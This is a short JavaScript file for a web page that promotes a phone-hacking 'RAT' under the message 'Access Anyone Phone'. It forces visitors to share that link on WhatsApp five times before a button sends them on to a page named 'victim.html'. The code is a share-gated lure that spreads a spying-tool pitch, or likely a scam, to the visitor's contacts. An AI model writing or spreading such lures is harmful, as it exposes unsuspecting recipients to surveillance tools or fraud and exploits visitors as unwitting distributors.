// js/share.js

document.addEventListener("DOMContentLoaded", function() {
  const shareBtn = document.getElementById("shareBtn");
  const continueBtn = document.getElementById("continueBtn");
  const shareCountText = document.getElementById("shareCount");

  let shareCount = 0;
  const requiredShares = 5;

  // WhatsApp message
  const shareMessage = encodeURIComponent(
    "Access Anyone Phone.....\nhttps://a3organisationa3-ops.github.io/RAT/"
  );

  // WhatsApp Share Button Click
  shareBtn.addEventListener("click", function() {
    window.open(`https://wa.me/?text=${shareMessage}`, "_blank");

    shareCount++;
    shareCountText.textContent = shareCount;

    // Unlock continue button
    if (shareCount >= requiredShares) {
      continueBtn.disabled = false;
      continueBtn.classList.remove("btn-locked");
      continueBtn.classList.add("btn-active");
    }
  });

  // Continue Button Click
  continueBtn.addEventListener("click", function() {
    if (shareCount >= requiredShares) {
      window.location.href = "victim.html";
    } else {
      alert("Please share with 5 friends first!");
    }
  });
});
